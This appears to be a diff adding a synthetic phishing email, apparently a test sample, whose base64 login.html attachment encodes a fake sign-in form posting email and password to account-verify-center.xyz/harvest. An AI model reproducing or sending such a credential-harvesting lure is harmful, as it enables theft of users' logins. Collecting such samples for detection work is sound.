@@ -1,0 +1,39 @@
+Received: from out.throwaway-mailer.top (out.throwaway-mailer.top [198.51.100.202]) by mx.example.org (Postfix) with ESMTPS id E4E4E4 for <jordan.lee@example.org>; Thu, 29 Jan 2026 10:05:55 +0000 (UTC)
+Authentication-Results: mx.example.org; spf=pass smtp.mailfrom=bounce@throwaway-mailer.top; dkim=pass header.d=throwaway-mailer.top header.s=t1; dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=throwaway-mailer.top
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=throwaway-mailer.top; s=t1; t=1769681155; bh=MXlensFakeBodyHashLLL=; h=From:To:Subject:Date; b=SFRNTF9BVFRBQ0hfMTRfRkFLRV9TSUdOX1ZBTFVFX05PVF9SRUFM
+From: "Secure Document" <docs@throwaway-mailer.top>
+To: jordan.lee@example.org
+Subject: Encrypted document - open attached file
+Date: Thu, 29 Jan 2026 10:05:53 +0000
+Message-ID: <14-ha@throwaway-mailer.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b14mix"
+
+--b14mix
+Content-Type: multipart/alternative; boundary="b14alt"
+
+--b14alt
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+A secure document is attached. Open login.html and sign in to view it.
+--b14alt
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+<html><body><p>A secure document is attached. Open <b>login.html</b> and sign in to view it.</p></body></html>
+--b14alt--
+
+--b14mix
+Content-Type: text/html; name="login.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="login.html"
+
+PCFkb2N0eXBlIGh0bWw+PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiPjx0aXRsZT5T
+aWduIGluPC90aXRsZT48L2hlYWQ+PGJvZHk+PGgyPkRvY3VtZW50IGFjY2VzczwvaDI+PGZvcm0g
+YWN0aW9uPSJodHRwczovL2FjY291bnQtdmVyaWZ5LWNlbnRlci54eXovaGFydmVzdCIgbWV0aG9k
+PSJQT1NUIj48bGFiZWw+RW1haWw8L2xhYmVsPjxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0idXNl
+ciI+PGxhYmVsPlBhc3N3b3JkPC9sYWJlbD48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBh
+c3MiPjxidXR0b24gdHlwZT0ic3VibWl0Ij5WaWV3IGRvY3VtZW50PC9idXR0b24+PC9mb3JtPjwv
+Ym9keT48L2h0bWw+
+--b14mix--
